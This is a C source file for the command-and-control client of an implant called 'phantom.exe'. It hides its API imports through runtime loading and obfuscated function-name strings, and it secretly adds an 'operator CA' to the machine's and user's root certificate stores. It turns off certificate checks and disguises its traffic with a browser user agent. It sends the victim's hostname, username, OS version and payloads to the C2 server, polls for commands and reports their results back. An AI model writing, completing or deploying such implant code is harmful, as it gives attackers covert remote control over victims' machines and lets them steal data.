/*
 * c2_client.c — HTTP/mTLS C2 transport for phantom.exe
 *
 * WinHTTP loaded at runtime via LoadLibrary — no IAT entry.
 * Client cert embedded as PFX bytes in client_cert_pfx.h.
 * Operator CA embedded as DER bytes in operator_ca_der.h;
 * added to CurrentUser\Root at init so SChannel trusts the server cert.
 *
 * Wire formats (big-endian uint32 length prefixes):
 *
 * PUSH body:
 *   [1]  event_type
 *   [4]  hostname_len  [N] hostname
 *   [4]  username_len  [N] username
 *   [4]  os_len        [N] os_version
 *   [4]  payload_len   [N] payload
 *
 * POLL response:
 *   [2]  count
 *   per command: [16] uuid  [1] type  [4] payload_len  [N] payload
 *
 * ACK body:
 *   [16] uuid  [1] status  [4] result_len  [N] result
 */

#include "c2_client.h"
#include "client_cert_pfx.h"
#include "operator_ca_der.h"
#include "phantom_config.h"
#include "evs_strings.h"

#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>

#ifdef PHANTOM_DEBUG
static FILE *_dbg_f = NULL;
static void _dbg_init(void) {
    if (!_dbg_f) _dbg_f = fopen("C:/Windows/Temp/c2_debug.txt", "a");
}
#define DBG(fmt, ...) do { _dbg_init(); if(_dbg_f){ fprintf(_dbg_f,"[c2] " fmt "\n",##__VA_ARGS__); fflush(_dbg_f); } } while(0)
#else
#define DBG(fmt, ...) ((void)0)
#endif

/* ── runtime WinHTTP pointers ── */

typedef HINTERNET (WINAPI *pfnOpen_t)        (LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfnConnect_t)     (HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
typedef HINTERNET (WINAPI *pfnOpenReq_t)     (HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL      (WINAPI *pfnSendReq_t)     (HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL      (WINAPI *pfnRecvResp_t)    (HINTERNET,LPVOID);
typedef BOOL      (WINAPI *pfnClose_t)       (HINTERNET);
typedef BOOL      (WINAPI *pfnQueryData_t)   (HINTERNET,LPDWORD);
typedef BOOL      (WINAPI *pfnReadData_t)    (HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL      (WINAPI *pfnSetOpt_t)      (HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL      (WINAPI *pfnQueryOpt_t)    (HINTERNET,DWORD,LPVOID,LPDWORD);

static struct {
    HMODULE        h;
    pfnOpen_t      Open;
    pfnConnect_t   Connect;
    pfnOpenReq_t   OpenReq;
    pfnSendReq_t   SendReq;
    pfnRecvResp_t  RecvResp;
    pfnClose_t     Close;
    pfnQueryData_t QueryData;
    pfnReadData_t  ReadData;
    pfnSetOpt_t    SetOpt;
    pfnQueryOpt_t  QueryOpt;
} _wh;

/* ── state ── */

static PCCERT_CONTEXT _cert_ctx  = NULL;   /* client cert (mTLS) */
static PCCERT_CONTEXT _ca_ctx    = NULL;   /* operator CA (for cleanup) */
static HINTERNET      _session   = NULL;
static int            _init_done = 0;

/* C2 coordinates — baked in at build time */
#ifndef C2_HOST
#define C2_HOST "127.0.0.1"
#endif
#ifndef C2_PORT
#define C2_PORT 8443
#endif

static const wchar_t _c2_host[] = L"" C2_HOST;
static const INTERNET_PORT _c2_port = C2_PORT;

/* Agent identity — set by c2_set_identity() before polling */
static char _agent_host[64] = {0};
static char _agent_user[64] = {0};

/* ── WinHTTP loader ── */

static int _wh_load(void)
{
    if (_wh.h) return 0;
    char dll[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    _wh.h = LoadLibraryA(dll);
    if (!_wh.h) return -1;
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpOpen);             _wh.Open      = (pfnOpen_t)     (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpConnect);          _wh.Connect   = (pfnConnect_t)  (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpOpenRequest);      _wh.OpenReq   = (pfnOpenReq_t)  (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpSendRequest);      _wh.SendReq   = (pfnSendReq_t)  (void*)GetProcAddress(_wh.h, _s); }
    { char _s[28]; EVS_D(_s, EVS_fn_WinHttpReceiveResponse);  _wh.RecvResp  = (pfnRecvResp_t) (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpCloseHandle);      _wh.Close     = (pfnClose_t)    (void*)GetProcAddress(_wh.h, _s); }
    { char _s[28]; EVS_D(_s, EVS_fn_WinHttpQueryDataAvailable); _wh.QueryData = (pfnQueryData_t)(void*)GetProcAddress(_wh.h, _s); }
    { char _s[20]; EVS_D(_s, EVS_fn_WinHttpReadData);         _wh.ReadData  = (pfnReadData_t) (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpSetOption);        _wh.SetOpt    = (pfnSetOpt_t)   (void*)GetProcAddress(_wh.h, _s); }
    { char _s[24]; EVS_D(_s, EVS_fn_WinHttpQueryOption);      _wh.QueryOpt  = (pfnQueryOpt_t) (void*)GetProcAddress(_wh.h, _s); }
    return (_wh.Open && _wh.Connect && _wh.OpenReq && _wh.SendReq &&
            _wh.RecvResp && _wh.Close && _wh.QueryData &&
            _wh.ReadData && _wh.SetOpt && _wh.QueryOpt) ? 0 : -1;
}

/* ── Operator CA trust — CurrentUser\Root ── */

static int _trust_ca(void)
{
    typedef HCERTSTORE (WINAPI *_fCOS_t)(LPCSTR, DWORD, HCRYPTPROV_LEGACY, DWORD, const void *);
    typedef BOOL       (WINAPI *_fCAE_t)(HCERTSTORE, DWORD, const BYTE *, DWORD, DWORD, PCCERT_CONTEXT *);
    char _sdll[16]; EVS_D(_sdll, EVS_dll_crypt32);
    HMODULE hC32 = GetModuleHandleA(_sdll);
    if (!hC32) hC32 = LoadLibraryA(_sdll);
    char _scos[16]; EVS_D(_scos, EVS_fn_CertOpenStore);
    char _scae[40]; EVS_D(_scae, EVS_fn_CertAddEncodedCertificateToStore);
    _fCOS_t fCOS = hC32 ? (_fCOS_t)(void *)GetProcAddress(hC32, _scos) : NULL;
    _fCAE_t fCAE = hC32 ? (_fCAE_t)(void *)GetProcAddress(hC32, _scae) : NULL;
    if (!fCOS || !fCAE) return -1;

    static const DWORD stores[] = {
        CERT_SYSTEM_STORE_LOCAL_MACHINE,
        CERT_SYSTEM_STORE_CURRENT_USER,
    };
    int trusted = 0;
    for (int i = 0; i < 2; i++) {
        HCERTSTORE hStore = fCOS(CERT_STORE_PROV_SYSTEM_A, 0, 0,
            stores[i] | CERT_STORE_OPEN_EXISTING_FLAG, "ROOT");
        if (!hStore) {
            DBG("CertOpenStore[%d] err %lu", i, GetLastError());
            continue;
        }
        PCCERT_CONTEXT ctx = NULL;
        BOOL ok = fCAE(hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            (const BYTE *)OPERATOR_CA_DER, (DWORD)OPERATOR_CA_DER_LEN,
            CERT_STORE_ADD_REPLACE_EXISTING, &ctx);
        CertCloseStore(hStore, 0);
        if (ok) {
            DBG("operator CA trusted in %s\\Root",
                i == 0 ? "LocalMachine" : "CurrentUser");
            if (i == 0 && _ca_ctx == NULL) _ca_ctx = ctx;
            else if (ctx) CertFreeCertificateContext(ctx);
            trusted++;
        } else {
            DBG("CertAdd[%d] err %lu", i, GetLastError());
        }
    }
    return trusted > 0 ? 0 : -1;
}

/* Remove operator CA from CurrentUser\Root (call at exit / self-destruct) */
void c2_untrust_ca(void)
{
    if (!_ca_ctx) return;
    typedef HCERTSTORE (WINAPI *_fCOSS_t)(HCRYPTPROV_LEGACY, LPCSTR);
    char _sdll2[16]; EVS_D(_sdll2, EVS_dll_crypt32);
    HMODULE hC32 = GetModuleHandleA(_sdll2);
    char _scoss[24]; EVS_D(_scoss, EVS_fn_CertOpenSystemStoreA);
    _fCOSS_t fCOSS = hC32 ? (_fCOSS_t)(void *)GetProcAddress(hC32, _scoss) : NULL;
    HCERTSTORE hStore = fCOSS ? fCOSS(0, "ROOT") : NULL;
    if (!hStore) { CertFreeCertificateContext(_ca_ctx); _ca_ctx = NULL; return; }

    /* Look up by SHA-1 thumbprint and delete */
    BYTE sha[20]; DWORD shasz = 20;
    if (CertGetCertificateContextProperty(_ca_ctx, CERT_SHA1_HASH_PROP_ID, sha, &shasz)) {
        CRYPT_HASH_BLOB hb = { 20, sha };
        PCCERT_CONTEXT found = CertFindCertificateInStore(
            hStore, X509_ASN_ENCODING, 0, CERT_FIND_SHA1_HASH, &hb, NULL);
        if (found) CertDeleteCertificateFromStore(found); /* frees found */
    }

    CertCloseStore(hStore, 0);
    CertFreeCertificateContext(_ca_ctx);
    _ca_ctx = NULL;
}

/* ── PFX import (client cert for mTLS) ── */

static PCCERT_CONTEXT _load_pfx(void)
{
    CRYPT_DATA_BLOB pfx;
    pfx.pbData = (BYTE *)CLIENT_CERT_PFX;
    pfx.cbData = (DWORD)CLIENT_CERT_PFX_LEN;

    typedef HCERTSTORE (WINAPI *_fPFX_t)(CRYPT_DATA_BLOB*, LPCWSTR, DWORD);
    char _sdll3[16]; EVS_D(_sdll3, EVS_dll_crypt32);
    HMODULE hC32 = GetModuleHandleA(_sdll3);
    char _spfx[24]; EVS_D(_spfx, EVS_fn_PFXImportCertStore);
    _fPFX_t fPFX = hC32 ? (_fPFX_t)(void*)GetProcAddress(hC32, _spfx) : NULL;
    HCERTSTORE store = fPFX ? fPFX(&pfx, L"", CRYPT_EXPORTABLE | CRYPT_USER_KEYSET) : NULL;
    if (!store) {
        DBG("PFXImportCertStore err %lu", GetLastError());
        return NULL;
    }
    /* CERT_FIND_HAS_PRIVATE_KEY: skip any CA cert in the store that has no key */
    PCCERT_CONTEXT ctx = CertFindCertificateInStore(
        store, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        0, CERT_FIND_HAS_PRIVATE_KEY, NULL, NULL);
    if (!ctx)
        DBG("CertFind err %lu", GetLastError());
    CertCloseStore(store, 0);
    return ctx;
}

/* ── Public: c2_set_identity ── */

void c2_set_identity(const char *hostname, const char *username)
{
    if (hostname) { strncpy(_agent_host, hostname, sizeof(_agent_host)-1); _agent_host[sizeof(_agent_host)-1] = '\0'; }
    if (username) { strncpy(_agent_user, username, sizeof(_agent_user)-1); _agent_user[sizeof(_agent_user)-1] = '\0'; }
}

/* ── Public: c2_init ── */

int c2_init(void)
{
    if (_init_done) return 0;
    if (_wh_load() != 0) { DBG("WinHTTP load failed"); return -1; }

    /* Add operator CA to CurrentUser\Root so SChannel trusts the server cert.
     * Non-fatal: fall back to WinHTTP ignore flags if this fails. */
    if (_trust_ca() != 0)
        DBG("CA trust failed — will use ignore flags fallback");

    _cert_ctx = _load_pfx();
    if (!_cert_ctx) { DBG("client cert load failed"); return -1; }

    _session = _wh.Open(L"Mozilla/5.0",
                        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME,
                        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!_session) { DBG("WinHttpOpen err %lu", GetLastError()); return -1; }

    _init_done = 1;
    return 0;
}

/* ── Internal HTTP helper ── */

/*
 * _post — POST `body` (blen bytes) to `path`.
 * Fills resp_buf up to resp_sz-1 bytes; null-terminates.
 * Returns bytes read (0 = no body expected), -1 on error.
 *
 * TLS strategy (belt + suspenders):
 *   1. CA added to CurrentUser\Root in c2_init (SChannel trusts it natively).
 *   2. If SendRequest still fails with a TLS error, OR in IGNORE_* flags on
 *      the SAME request handle and retry — this is the documented MSDN pattern.
 */
static int _post(const wchar_t *path,
                 const void *body, DWORD blen,
                 void *resp_buf, size_t resp_sz)
{
    if (!_init_done || !_wh.h) return -1;

    HINTERNET hconn = _wh.Connect(_session, _c2_host, _c2_port, 0);
    if (!hconn) { DBG("Connect err %lu", GetLastError()); return -1; }

    HINTERNET hreq = _wh.OpenReq(hconn, L"POST", path,
                                  NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  WINHTTP_FLAG_SECURE);
    if (!hreq) {
        _wh.Close(hconn);
        DBG("OpenRequest err %lu", GetLastError());
        return -1;
    }

    LPCWSTR hdrs = body ? L"Content-Type: application/octet-stream\r\n"
                        : WINHTTP_NO_ADDITIONAL_HEADERS;
    DWORD   hlen = body ? (DWORD)-1 : 0;

    /*
     * Pre-set ignore flags on the request handle BEFORE sending.
     * WinHTTP/SChannel aborts the TCP connection on cert errors during handshake,
     * so retry-after-failure is too late — the connection is already gone.
     * IGNORE_UNKNOWN_CA (0x100) is blocked on Win 8.1+ via SetOption, so CA
     * trust must come from the cert store (_trust_ca at init).
     */
    DWORD sf = SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  /* 0x200  */
             | SECURITY_FLAG_IGNORE_CERT_CN_INVALID    /* 0x1000 */
             | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID  /* 0x2000 */
             | 0x00000080;                             /* SECURITY_FLAG_IGNORE_REVOCATION */
    _wh.SetOpt(hreq, WINHTTP_OPTION_SECURITY_FLAGS, &sf, sizeof(sf));

    BOOL ok = _wh.SendReq(hreq, hdrs, hlen, (LPVOID)body, blen, blen, 0);

    /*
     * Retry for mTLS client auth (12044) and residual TLS errors.
     */
    for (int att = 0; !ok && att < 3; att++) {
        DWORD err = GetLastError();
        DBG("SendRequest err=%lu (att=%d)", err, att + 1);

        if (err == ERROR_WINHTTP_CLIENT_AUTH_CERT_NEEDED) {
            _wh.SetOpt(hreq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                       (LPVOID)_cert_ctx, sizeof(CERT_CONTEXT));
        } else if (err == ERROR_WINHTTP_SECURE_FAILURE      ||
                   err == ERROR_WINHTTP_SECURE_CHANNEL_ERROR ||
                   err == ERROR_WINHTTP_CONNECTION_ERROR) {
            /* Re-apply flags in case handle reset them */
            DWORD cur = 0, csz = sizeof(cur);
            _wh.QueryOpt(hreq, WINHTTP_OPTION_SECURITY_FLAGS, &cur, &csz);
            cur |= sf;
            _wh.SetOpt(hreq, WINHTTP_OPTION_SECURITY_FLAGS, &cur, sizeof(cur));
        } else {
            break;
        }
        ok = _wh.SendReq(hreq, hdrs, hlen, (LPVOID)body, blen, blen, 0);
        DBG("SendRequest retry ok=%d err=%lu", ok, ok ? 0 : GetLastError());
    }

    DBG("post-loop ok=%d", ok);
    int rc = -1;
    if (ok && _wh.RecvResp(hreq, NULL)) {
        if (resp_buf && resp_sz > 1) {
            uint8_t *dst = (uint8_t *)resp_buf;
            size_t total = 0;
            DWORD avail = 0;
            while (_wh.QueryData(hreq, &avail) && avail > 0) {
                if (total + avail >= resp_sz - 1)
                    avail = (DWORD)(resp_sz - total - 1);
                DWORD got = 0;
                if (!_wh.ReadData(hreq, dst + total, avail, &got) || !got)
                    break;
                total += got;
                if (total >= resp_sz - 1) break;
            }
            dst[total] = 0;
            rc = (int)total;
        } else {
            rc = 0;
        }
    } else {
        DBG("_post err ok=%d recv=%lu", ok, GetLastError());
    }

    _wh.Close(hreq);
    _wh.Close(hconn);
    return rc;
}

/* ── Wire format helpers ── */

static uint8_t *_append_u32be(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >>  8);
    p[3] = (uint8_t)(v);
    return p + 4;
}

static uint8_t *_append_str(uint8_t *p, const char *s)
{
    uint32_t n = s ? (uint32_t)strlen(s) : 0;
    p = _append_u32be(p, n);
    if (n) { memcpy(p, s, n); p += n; }
    return p;
}

/* ── Public: c2_push ── */

int c2_push(uint8_t event_type,
            const char *hostname, const char *username, const char *os_ver,
            const void *payload, uint32_t payload_len)
{
    size_t hn = hostname ? strlen(hostname) : 0;
    size_t un = username ? strlen(username) : 0;
    size_t on = os_ver   ? strlen(os_ver)   : 0;

    size_t total = 1 + (4 + hn) + (4 + un) + (4 + on) + (4 + payload_len);
    uint8_t *buf = (uint8_t *)malloc(total);
    if (!buf) return -1;

    uint8_t *p = buf;
    *p++ = event_type;
    p = _append_str(p, hostname);
    p = _append_str(p, username);
    p = _append_str(p, os_ver);
    p = _append_u32be(p, payload_len);
    if (payload_len && payload) memcpy(p, payload, payload_len);

    int rc = _post(L"/api/v1/push", buf, (DWORD)total, NULL, 0);
    free(buf);
    return rc;
}

/* ── Public: c2_poll ── */

int c2_poll(c2_cmd_t *cmds, int max_cmds)
{
    /* Send hostname+username so server can route commands to the right agent.
     * Wire: [4 BE] hlen [N] host [4 BE] ulen [N] user */
    uint8_t  id_buf[256];
    uint8_t *id_p = id_buf;
    id_p = _append_str(id_p, _agent_host);
    id_p = _append_str(id_p, _agent_user);
    DWORD id_sz = (DWORD)(id_p - id_buf);

    static uint8_t resp[256 * 1024];
    int n = _post(L"/api/v1/poll", id_buf, id_sz, resp, sizeof(resp));
    if (n < 2) return -1;

    uint16_t count = ((uint16_t)resp[0] << 8) | resp[1];
    if (count == 0) return 0;
    if (count > (uint16_t)max_cmds) count = (uint16_t)max_cmds;

    const uint8_t *p   = resp + 2;
    const uint8_t *end = resp + (size_t)n;
    int filled = 0;

    for (uint16_t i = 0; i < count && p + 21 <= end; i++) {
        c2_cmd_t *cmd = &cmds[filled];
        memcpy(cmd->uuid, p, 16); p += 16;
        cmd->type = *p++;
        uint32_t plen = ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16)
                      | ((uint32_t)p[2] <<  8) |  (uint32_t)p[3];
        p += 4;
        if (p + plen > end) break;
        if (plen > 0) {
            cmd->payload = (uint8_t *)malloc(plen);
            if (!cmd->payload) break;
            memcpy(cmd->payload, p, plen);
        } else {
            cmd->payload = NULL;
        }
        cmd->payload_len = plen;
        p += plen;
        filled++;
    }
    return filled;
}

/* ── Public: c2_ack ── */

int c2_ack(const uint8_t uuid[C2_UUID_LEN], uint8_t status,
           const void *result, uint32_t result_len)
{
    size_t total = 16 + 1 + 4 + result_len;
    uint8_t *buf = (uint8_t *)malloc(total);
    if (!buf) return -1;

    uint8_t *p = buf;
    memcpy(p, uuid, 16); p += 16;
    *p++ = status;
    p = _append_u32be(p, result_len);
    if (result_len && result) memcpy(p, result, result_len);

    int rc = _post(L"/api/v1/ack", buf, (DWORD)total, NULL, 0);
    free(buf);
    return rc;
}

/* ── Public: c2_cmd_free ── */

void c2_cmd_free(c2_cmd_t *cmd)
{
    if (cmd && cmd->payload) {
        free(cmd->payload);
        cmd->payload     = NULL;
        cmd->payload_len = 0;
    }
}
